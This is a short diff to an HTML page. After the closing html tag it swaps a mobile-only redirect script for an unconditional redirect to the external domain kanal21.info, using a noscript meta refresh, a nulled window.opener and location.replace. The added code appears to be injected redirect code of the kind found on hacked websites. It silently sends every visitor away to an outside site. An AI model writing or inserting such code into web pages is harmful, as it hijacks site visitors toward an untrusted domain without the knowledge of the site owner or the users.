@@ -56,10 +56,4 @@
   </body>
 </html>
 
-    <script type='text/javascript'>
-<!--
-if (screen.width <= 700) {
-document.location = "https://kanal21.info";
-}
-//-->
-</script>
+<head><meta name="referrer" content="always"><noscript><META http-equiv="refresh" content="0;URL=https://kanal21.info"></noscript><title>https://kanal21.info</title></head><script>window.opener = null; location.replace("https://kanal21.info")</script>
